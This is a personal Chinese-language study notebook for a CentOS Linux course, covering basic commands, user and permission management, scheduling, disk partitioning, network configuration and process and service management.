<h3 id="p6-centos安装"><a href="#p6-centos安装" class="headerlink" title="p6 centos安装"></a>p6 centos安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i5-10600KF		2个cpu?核心12线程 </span><br><span class="line">/boot引导分区			    1G		文件系统ext4</span><br><span class="line">/swap分区临时充当内存分区		2G</span><br><span class="line">/根分区 剩下的</span><br></pre></td></tr></table></figure>

<h3 id="p7-三种网络模式"><a href="#p7-三种网络模式" class="headerlink" title="p7 三种网络模式"></a>p7 三种网络模式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">桥接模式</span><br><span class="line">	虚拟系统可以和外部系统通讯，但是容易造成IP冲突，比如192.168.0网段只有254个ip（0，255不可用）</span><br><span class="line">NAT</span><br><span class="line">	网络地址转换模式，搞了个网关，可以和外部通讯，不会造成ip冲突，但是外部网络不能主动访问虚拟的Linux</span><br><span class="line">主机</span><br><span class="line">	独立的系统</span><br></pre></td></tr></table></figure>

<p>虚拟机共享文件夹没搞明白。。</p>
<h3 id="p12-目录结构"><a href="#p12-目录结构" class="headerlink" title="p12 目录结构"></a>p12 目录结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/bin 常使用命令</span><br><span class="line">/sbin</span><br><span class="line">/home 用户目录</span><br><span class="line">useradd jack</span><br><span class="line">userdel -r jack</span><br><span class="line">/root</span><br><span class="line">/lib 系统开机所需要最基本的动态连接共享库，作用类似于windows的dll</span><br><span class="line">/lost+found 一般为空，系统非法关机后这会存放一些文件</span><br><span class="line">/etc 所有的系统管理所需要的配置文件和子目录my.conf</span><br><span class="line">/usr 用户应用程序和文件 同windowsprog files</span><br><span class="line">/usr/local 给主机额外安装软件所安装的目录 一般通过编译源码方式安装的程序</span><br><span class="line">/boot 启动linux核心文件 连接文件和镜像文件</span><br><span class="line">/proc 虚拟的目录 系统内存的映射 访问目录获取系统信息 不能动</span><br><span class="line">/srv service 存放服务启动后需要提取的数据 不能动</span><br><span class="line">/sys linux2.6内核的一个变化 该目录安装了2.6内核中新出现的文件系统sysfs 不能动</span><br><span class="line">/tmp 临时文件</span><br><span class="line">/dev 类似windows的设备管理器 所有硬件用文件形式存储</span><br><span class="line">/media linux自动识别一些设备 如u盘 光驱 识别后会把识别的设备挂载到这个目录下</span><br><span class="line">/mnt 为了让用户临时挂载别的文件系统 可以把外部存储挂载的/mnt上</span><br><span class="line">/opt 给主机额外安装软件摆放的目录 比如oracle数据库</span><br><span class="line">/var 各种日志</span><br><span class="line">/selinux 安全子系统 能控制程序只能访问特定文件</span><br></pre></td></tr></table></figure>

<h3 id="p16-Vi-Vim"><a href="#p16-Vi-Vim" class="headerlink" title="p16 Vi Vim"></a>p16 Vi Vim</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">正常模式</span><br><span class="line">	删除字符 删除整行 复制黏贴</span><br><span class="line">插入模式</span><br><span class="line">	正常到插入模式i I o O a A r R</span><br><span class="line">命令行模式</span><br><span class="line">    esc从插入退出到正常模式</span><br><span class="line">    :或/从正常模式切换到命令行模式</span><br><span class="line">    命令行模式wq  (write quit)</span><br><span class="line">    :q :q!(强制退出，不保存)</span><br><span class="line">快捷键</span><br><span class="line">	1.拷贝当前行yy 5yy拷贝当前行向下5行 黏贴为p</span><br><span class="line">	2.删除当前行dd 5dd删除当前行向下5行</span><br><span class="line">	3.普通模式下/a 搜索a  n为下一个</span><br><span class="line">	4.一般模式:set nu设置行号 :set nonu取消行号</span><br><span class="line">	5.一般模式[G]最末行 [gg]首行</span><br><span class="line">	6.一般模式 u撤销</span><br><span class="line">	7.一般模式 45 shift+g快速定位到45行</span><br></pre></td></tr></table></figure>

<h3 id="p19关机重启"><a href="#p19关机重启" class="headerlink" title="p19	关机重启"></a>p19	关机重启</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shutdown -h now		立刻关机		(halt)</span><br><span class="line">shutdown -h 1		1分钟关机</span><br><span class="line">shutdown -r now    					(reboot)</span><br><span class="line">halt</span><br><span class="line">reboot</span><br><span class="line">sync		内存数据同步到磁盘</span><br></pre></td></tr></table></figure>

<h3 id="p20登录注销"><a href="#p20登录注销" class="headerlink" title="p20	登录注销"></a>p20	登录注销</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su登录</span><br><span class="line">logout注销</span><br></pre></td></tr></table></figure>

<h3 id="p21用户管理"><a href="#p21用户管理" class="headerlink" title="p21	用户管理"></a>p21	用户管理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">useradd 用户名 自动创建家目录，且自动切换到该目录</span><br><span class="line">useradd -d 指定目录</span><br><span class="line">passwd 用户名	指定密码</span><br><span class="line">who am i 显示第一次登录到的信息</span><br><span class="line">groupadd 组名 新增组</span><br><span class="line">groupdel 组名 删除组</span><br><span class="line">usermod -g 用户组 用户名</span><br></pre></td></tr></table></figure>

<h4 id="用户和组相关文件"><a href="#用户和组相关文件" class="headerlink" title="用户和组相关文件"></a>用户和组相关文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">	用户配置文件，记录用户各种信息</span><br><span class="line">	用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录shell</span><br><span class="line">/etc/shadow</span><br><span class="line">	口令配置文件</span><br><span class="line">	登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</span><br><span class="line">/etc/group</span><br><span class="line">	组配置文件</span><br><span class="line">	组名:口令:组标识号:组内用户列表</span><br></pre></td></tr></table></figure>

<h3 id="p26-如何找回root密码"><a href="#p26-如何找回root密码" class="headerlink" title="p26 如何找回root密码"></a>p26 如何找回root密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Snowflake1997/article/details/121498049</span><br></pre></td></tr></table></figure>

<h3 id="p27-命令"><a href="#p27-命令" class="headerlink" title="p27 命令"></a>p27 命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">man ls		man获得帮助信息</span><br><span class="line">help 		获得shell内置的帮助信息</span><br><span class="line">pwd			显示当前工作目录绝对路径</span><br><span class="line">ls  		-a显示全部  -l以列表形式</span><br><span class="line">cd ~</span><br><span class="line">cd ..</span><br><span class="line">mkdir		创建文件夹			-p创建多级目录</span><br><span class="line">rmdir  		删除空目录			rm -rf强制删除非空目录</span><br><span class="line">touch		创建空文件</span><br><span class="line">cp [选项]	source destination		-r递归复制 相当于复制有文件的文件夹</span><br><span class="line">\cp 强制覆盖 可能会有相同的文件要选择yes</span><br><span class="line">rm 移除文件或目录 			-r递归删除整个文件夹 -f强制不提示</span><br><span class="line">mv 移动文件或者重命名 		mv oldNameFile newNameFile</span><br><span class="line">cat 查看文件内容 		-n显示行号</span><br><span class="line">cat hello.txt | more		管道命令把前面的结果交给下面处理</span><br><span class="line">more space向下一页enter一行q退出 ctrl+f向下一屏 ctrl+b上一屏</span><br><span class="line">less 分屏查看</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665241096035.png" alt="1665241096035"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo 输出内容到控制台 			echo $PATH 		echo $HOSTNAME环境变量</span><br><span class="line">head 默认显示前10行内容			-n 行数</span><br><span class="line">tail 默认尾10行内容		      -n 行数 -f实时追踪文件更新</span><br><span class="line">&gt; 输出重定向 覆盖</span><br><span class="line">&gt;&gt; 追加 末尾</span><br><span class="line">ln 软链接 类似windows里的快捷方式		ln -s [源文件或目录] [软链接名] rm删除</span><br><span class="line">history 查看执行过的历史命令</span><br></pre></td></tr></table></figure>

<h3 id="p34-时间日期指令"><a href="#p34-时间日期指令" class="headerlink" title="p34 时间日期指令"></a>p34 时间日期指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cal 日历</span><br><span class="line">date</span><br></pre></td></tr></table></figure>

<h3 id="p35-查找"><a href="#p35-查找" class="headerlink" title="p35 查找"></a>p35 查找</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find /root -name hello2.txt		-name 被查找文件名</span><br><span class="line">find /opt -user root			-user 查找root用户创建的文件</span><br><span class="line">		-size （+n 大于 -n小于 n等于）</span><br><span class="line">locate快速定位文件</span><br><span class="line">	首次使用需要updatedb     locate hello2.txt</span><br><span class="line">which 查找指令位置</span><br><span class="line">	which reboot		which ls</span><br><span class="line">grep 过滤查找</span><br></pre></td></tr></table></figure>

<h3 id="p37-压缩解压"><a href="#p37-压缩解压" class="headerlink" title="p37 压缩解压"></a>p37 压缩解压</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gzip 压缩为*.gz</span><br><span class="line">gunzip 解压*.gz文件</span><br><span class="line"></span><br><span class="line">zip unzip *.zip		-d指定解压后文件的存放目录	-r递归压缩目录</span><br><span class="line"></span><br><span class="line">tar	*.tar.gz</span><br><span class="line">	-c 产生.tar打包文件</span><br><span class="line">	-v 显示详细信息</span><br><span class="line">	-f 指定压缩后的文件名</span><br><span class="line">	-z 打包同时压缩</span><br><span class="line">	-x 解压.tar文件</span><br><span class="line">	tar -zcvf hello.tar.gz hello2.txt hello3.txt		压缩</span><br><span class="line">	tar -zxvf hhh.tar.gz								解压</span><br></pre></td></tr></table></figure>

<h3 id="p40-组管理和权限管理"><a href="#p40-组管理和权限管理" class="headerlink" title="p40 组管理和权限管理"></a>p40 组管理和权限管理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ls -ahl 查看文件所有者 ll ls -l</span><br><span class="line">chgrp root hyy19.txt	更改文件所在组</span><br><span class="line">其他组 除文件所有者和所在组的用户外，系统的其他用户都是文件的其他组</span><br><span class="line">usermod -g 组名 用户名			改变用户所在组</span><br><span class="line">usermod -d 目录名 用户名			改变用登录初始目录</span><br><span class="line"></span><br><span class="line">drwxr-xr-x. 2 root  root 6 5月  11 14:06 6508</span><br><span class="line">ll /dev 设备文件</span><br><span class="line">第0位 l链接 d目录 c字符设备文件，鼠标键盘 b块设备，比如硬盘</span><br><span class="line">1-3		所有者权限		读写执行</span><br><span class="line">4-6		组权限</span><br><span class="line">7-9		其他用户权限</span><br><span class="line">权限后的数字表示文件夹内文件综合包括文件夹</span><br><span class="line">chmod 777 文件名 		r=4 w=2 x=1</span><br><span class="line">chown 修改文件所有者</span><br><span class="line">	chown hyy19 Hello.java  更改文件所有者 高级权限可改</span><br><span class="line">useradd创建的/home/新用户文件夹所在组和其他组没有访问权限，只有所有者和管理员有权限</span><br></pre></td></tr></table></figure>

<h3 id="p52-任务调度"><a href="#p52-任务调度" class="headerlink" title="p52 任务调度"></a>p52 任务调度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">概述：指系统在某个时间执行的特定的命令或程序</span><br><span class="line">任务调度分类：</span><br><span class="line">	1.系统工作 须周而复始地执行 病毒扫描</span><br><span class="line">	2.个别用户工作 mysql数据库备份</span><br><span class="line">基本语法</span><br><span class="line">	crontab</span><br><span class="line">		-e 编辑crontab定时任务</span><br><span class="line">			*/1 * * * * ls -l /etc/ &gt; /tmp/to.txt</span><br><span class="line">		-l 查询crontab任务</span><br><span class="line">		-r 删除当前用户所有的crontab任务</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665304721583.png" alt="1665304721583"></p>
<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665305280985.png" alt="1665305280985"><img src="C:\Users\hyy\Desktop\编程语言.assets\1665305395338.png" alt="1665305395338"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">一次性定时任务</span><br><span class="line">	at命令是一次性定时任务 at守护进程atd回忆后台模式来运行</span><br><span class="line">	使用ps -ef | grep atd</span><br><span class="line">	</span><br><span class="line">    2天后下午5点执行 /bin/ls /home</span><br><span class="line">    	at 5pm + 2 days			回车</span><br><span class="line">    	/bin/ls /home			ctrl+d 2次</span><br><span class="line">    atq命令来查看系统中没有执行的工作任务</span><br><span class="line">    	命令行atq</span><br><span class="line">    明天17点种，输出时间到指定文件内 比如/root/date100.log</span><br><span class="line">    	at 5pm tomorrow</span><br><span class="line">    	date &gt; /root/date100.log</span><br><span class="line">    2分钟后，输出时间到指定文件 比如/root/date200.log</span><br><span class="line">    	at now + 2 minutes</span><br><span class="line">    删除已经设置的任务，atrm编号</span><br><span class="line">    	atrm [编号]</span><br></pre></td></tr></table></figure>

<h3 id="p58磁盘分区"><a href="#p58磁盘分区" class="headerlink" title="p58磁盘分区"></a>p58磁盘分区</h3><p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665308679584.png" alt="1665308679584"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">挂载分区 lsblk</span><br><span class="line">	2种硬盘 IDE硬盘和SCSI硬盘 目前主要是SCSI</span><br><span class="line">	IDE		hdx~   x为盘号（a为基本盘 b为基本从属盘 c为辅助主盘 d为辅助从属盘），~表示分区1-4为主分区和扩展分区，5为逻辑分区，e.g.hda3表示第一个（a）IDE硬盘第三个分区，hdb2第二个（b）IDE硬盘第二个分区</span><br><span class="line">	SCSI 	sdx~</span><br><span class="line">	lsblk -f</span><br><span class="line">	mountpoint 挂载点</span><br><span class="line">在vmware设置中可以添加硬盘 重启后 lsblk就可以看到 sdb了</span><br><span class="line">fdisk /dev/sdb		开始对sdb硬盘挂载		fdisk /dev/sda则对sda硬盘挂载</span><br><span class="line">然后根据提示来		基本默认选择</span><br><span class="line">	m 显示命令列表</span><br><span class="line">	p 显示磁盘分区</span><br><span class="line">	n 新增分区</span><br><span class="line">	d 删除分区</span><br><span class="line">	w 写入并退出</span><br><span class="line">	....（此处有省略）</span><br><span class="line">分区需要格式化才能用		会增加uuid  此处sdb1 “1”是刚才选择新增的第一个分区</span><br><span class="line">	mkfs -t ext4 /dev/sdb1			ext4是分区类型		此时uuid添加完毕</span><br><span class="line">	mount /dev/sdb1 /newdisk		此时是临时挂载，重启后挂载会掉下来</span><br><span class="line">	vim打开/dev/fstab 按如下修改然后重启或者mount -a  此处文件类型不能ext4否则报错重启不了</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665324453590.png" alt="1665324453590"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df -h	可以查看磁盘使用情况</span><br><span class="line">查询指定目录的磁盘占用情况</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665325658423.png" alt="1665325658423"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ls -l | grep &quot;^-&quot;	抓取开头“-”</span><br><span class="line">ls -l | grep &quot;^-&quot; | wc -l		查看当前目录文件数量</span><br><span class="line">ls -l | grep &quot;^d&quot; | wc -l		查看当前目录目录数量</span><br><span class="line">ls -lR | grep &quot;^-&quot; | wc -l		查看当前目录以及子目录下文件数量</span><br><span class="line">tree /home	显示树状目录	如果没有tree指令使用哦那个yum install tree</span><br><span class="line"></span><br><span class="line">注意ll不显示隐藏文件，须ll -a或ls -all</span><br></pre></td></tr></table></figure>

<h3 id="p63-网络配置"><a href="#p63-网络配置" class="headerlink" title="p63 网络配置"></a>p63 网络配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">已知虚拟机ip 192.168.213.135   本地VMnet8 192.168.213.1</span><br><span class="line">虚拟机可以ping本地</span><br><span class="line">本地ping虚拟机 需要关闭本地公网防火墙	</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665328193812.png" alt="1665328193812"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">有线以太网适配器 192.168.31.236 默认网关192.168.31.1</span><br><span class="line">网关与互联网相连</span><br><span class="line">本地VMnet8通过有线网卡代理了  ----NAT</span><br><span class="line"></span><br><span class="line">在VMware-》编辑-》虚拟网络编辑器   可配置网络配置</span><br><span class="line">可以在如下控制面板中配置 单机属性</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665329046674.png" alt="1665329046674"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dhcp为自动分配 但可能导致每次分配的ip不一样，如果搞服务器集群的话</span><br><span class="line">static指定ip</span><br><span class="line">	vim /etc/sysconfig/network-scripts/ifcfg-ens33	如下图所示</span><br><span class="line">	改完之后需要在VMware-》编辑-》虚拟网络编辑器中讲子网改为192.168.213.0以及讲NAT网关改为对应的192.168.213.2</span><br><span class="line">	然后systemctl restart network或者重启</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665367231117.png" alt="1665367231117"></p>
<h3 id="p66-主机名与hosts映射"><a href="#p66-主机名与hosts映射" class="headerlink" title="p66 主机名与hosts映射"></a>p66 主机名与hosts映射</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hostname			查询主机名</span><br><span class="line">vim /etc/hostname	修改主机名</span><br><span class="line">设置主机名与hosts映射		DNS域名系统</span><br><span class="line">	windows中C:\Windows\System32\drivers\etc\hosts文件指定</span><br><span class="line">	linux中/etc/hosts指定</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g. /etc/hosts添加192.168.213.1 hyy511   后面的主机名是单向的，ping主机名解析到前面的ip</span><br><span class="line">此时关闭windows防火墙ping就通了</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">浏览器中输入网址</span><br><span class="line">	浏览器会先检查浏览器缓存中是否有该酩解析IP，若没有接检查操作系统DNS解析器缓存这两个缓存称为本地解析器缓存</span><br><span class="line">	第一次成功访问后浏览器或操作系统会缓存他的ip地址</span><br><span class="line">	windows中输入</span><br><span class="line">		ipconfig /displaydns		//DNS域名解析缓存</span><br><span class="line">		ipconfig /flushdns			//手动清理dns缓存</span><br><span class="line">	若本地解析器缓存没有找到对应映射，检查系统中hosts文件中有没有对应的域名IP映射</span><br><span class="line">	若本地DNS解析器缓存喝hosts文件均没有找到对应ip，则至域名服务DNS进行解析域</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h3 id="p68-进程管理"><a href="#p68-进程管理" class="headerlink" title="p68 进程管理"></a>p68 进程管理</h3><h4 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">每个执行的程序都是一个进程，每个都有一个pid号</span><br><span class="line">windows的资源监视器</span><br><span class="line">top指令</span><br><span class="line">ps</span><br><span class="line">	ps -aux | more</span><br><span class="line">        PID 进程识别号</span><br><span class="line">        TTY 终端机号</span><br><span class="line">        TIME 此进程所消CPU时间</span><br><span class="line">        CMD 正在执行的命令或进程名</span><br><span class="line">        STAT 状态  %CPU  %MEM  VSZ虚拟内存  RSS物理内存</span><br><span class="line">        -a 显示当前终端多有进程信息</span><br><span class="line">        -u 以用户格式显示</span><br><span class="line">        -x 显示后台进程运行参数</span><br><span class="line">  	ps -ef	以全格式显示当前所有进程，查看进程父进程</span><br><span class="line">  		-e 显示所有进程</span><br><span class="line">  		-f 全格式</span><br><span class="line">  		PPID 父进程ID</span><br><span class="line">  		C CPU用于计算执行优先级的因子。数值大，优先级小</span><br><span class="line">  		STIME 启动时间</span><br></pre></td></tr></table></figure>

<h4 id="kill-killall"><a href="#kill-killall" class="headerlink" title="kill killall"></a>kill killall</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kill [pid]		终止进程</span><br><span class="line">	ps -aux | grep sshd</span><br><span class="line">	root       1213  0.0  0.2 112900  4316 ?        Ss   10:37   0:00 /usr/sbin/sshd -D</span><br><span class="line">	kill 1213	此时已登录上来的保持登录 不能再上线新用户</span><br><span class="line">	/bin.systemstl start sshd.service		重启ssh服务  此时可以继续连接用户</span><br><span class="line">终止多个 killall</span><br><span class="line">	killall gedit				所有gedit打开的文本编辑器都被关闭</span><br><span class="line">	kill -9 [比如某个终端pid]		-9表示强制终止</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h4 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">进程树</span><br><span class="line">	-p 显示pid</span><br><span class="line">	-u 显示进程的用户</span><br></pre></td></tr></table></figure>

<h3 id="p73-服务管理"><a href="#p73-服务管理" class="headerlink" title="p73 服务管理"></a>p73 服务管理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">	服务本质就是进程，运行再后台，通常监听某个端口，等待其他程序的请求，比如mysqld，sshd，防火墙，也成为守护进程</span><br><span class="line">	centos7.0之前用service 服务名称 [start|stop|restart|reload|status] </span><br><span class="line">	centos7.0之后用systemctl [start|stop|restart|reload|status] 服务名称</span><br><span class="line">	</span><br><span class="line">查看服务名</span><br><span class="line">	setup 可以看到全部  前面带*号表示自动启动  空格取消 tab键退出</span><br><span class="line">	/etc/init.d 只能看到一部分</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h4 id="运行级别"><a href="#运行级别" class="headerlink" title="运行级别"></a>运行级别</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">运行级别介绍	通常3和5</span><br><span class="line">	0 停机状态 不能正常启动</span><br><span class="line">	1 单用户 找回丢失密码 root权限 用于系统维护 禁止远程登录	</span><br><span class="line">	2 多用户状态（没有NFS）没有网络服务</span><br><span class="line">	3 多用户状态有网络服务 无界面 登录后进入控制台命令行</span><br><span class="line">	4 系统未使用保留给用户</span><br><span class="line">	5 图形界面</span><br><span class="line">	6 系统重启 默认补课设为6</span><br><span class="line">init 0 即关机</span><br><span class="line">init 5 使用图形界面</span><br><span class="line">init 3 终端界面</span><br><span class="line">/etc/inittab		配置文件</span><br><span class="line"></span><br><span class="line">systemctl get-default 查看当前运行级别</span><br><span class="line">systemctl set-default multi-user.target		设置成多用户3级别</span><br><span class="line">	开机流程-》BIOS-》/boot（程序引导）-》systemd进程1-》运行级别-》运行级别对应服务</span><br></pre></td></tr></table></figure>

